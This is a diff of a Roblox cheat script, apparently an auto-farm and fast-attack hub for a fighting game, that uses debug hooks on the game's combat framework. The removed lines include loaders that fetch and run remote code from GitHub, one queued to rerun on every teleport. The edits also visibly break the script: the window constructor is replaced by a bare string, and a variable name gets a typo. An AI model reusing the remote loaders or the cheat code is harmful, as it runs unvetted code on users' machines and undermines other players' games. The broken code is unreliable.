@@ -1,9 +1,3 @@
-local queue_on_teleport = queue_on_teleport
-
-if syn then queue_on_teleport = syn.queue_on_teleport end
-queue_on_teleport([[   loadstring(game:HttpGet("https://raw.githubusercontent.com/accountnop/magmaisgay/main/magma"))()
-]])
-
 local plr = game.Players.LocalPlayer
 
 local CbFw = debug.getupvalues(require(plr.PlayerScripts.CombatFramework))
@@ -198,7 +192,6 @@ function Update:Window(text,logo,keybind)
 	
 	local SOMEXHUB = Instance.new("ScreenGui")
 	SOMEXHUB.Name = "2BK2"
-	SOMEXHUB.Parent = game.CoreGui
 	SOMEXHUB.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 
 	local Main = Instance.new("Frame")
@@ -2411,8 +2404,7 @@ else
 	getgenv()['MyName'] = "None"
 	_G.Dis = true
 end
-
-local Library = Update:Window("2BK2","",Enum.KeyCode.RightControl);
+local Library = ("2BK2")
 main = Library:Tab("កន្លែងដើម")
 Main = Library:Tab("ហ្វាមល្វែលដោយខ្លួនអែង")
 iain = Library:Tab("Auto")
@@ -2470,8 +2462,6 @@ main:Button("Join Telegram ! ",function()
 getgenv().InviteCode = "https://t.me/brokhl"
 
 --Example getgenv().InviteCode = "pATHmbedmh"
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaQLeak/Scripts/main/Discord-Auto-Join.lua"))()
 
 end)
 main:Seperator("Servers")   
@@ -3523,7 +3513,7 @@ set:Toggle("Fast Attack 5",false,function(value)
         end)
 
 
---[[
+
     set:Toggle("Very Fast Attack 1",false,function(value)
         getgenv().FastAttack = value
         
@@ -3727,7 +3717,6 @@ spawn(function()
     end
 end)
    end)
-]]
    
     Main:Toggle("Delete Attack Flx",nil,function(d)
     _G.DeleteAttackFx = d
@@ -6376,7 +6365,7 @@ end)
 	    iain:Seperator("Dark Coat (Premium Only)")
 
 		
---[[
+
     
 	    iain:Toggle("Auto Dark Coat",_G.Setting_table.Auto_Dark_Coat,function(vu)
    	if _G.SelectWeapon == nil or _G.Setting_table.Weapon == nil then
@@ -6424,7 +6413,6 @@ end)
 	Update_Setting(getgenv()['MyName'])
     end)
 
-]]
 spawn(function()
 	while wait(.5) do
 		pcall(function()
@@ -7029,7 +7017,7 @@ end)
                                                     PosMonEvo = v.HumanoidRootPart.CFrame
                                                     StartEvoMagnet = true
                                                 until game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Flower 3") or not v.Parent or v.Humanoid.Health <= 0 or _G.Auto_EvoRace == false
-                                                StartEvoMagnet = false
+                                                Star0tEvoMagnet = false
                                             end
                                         end
                                     else
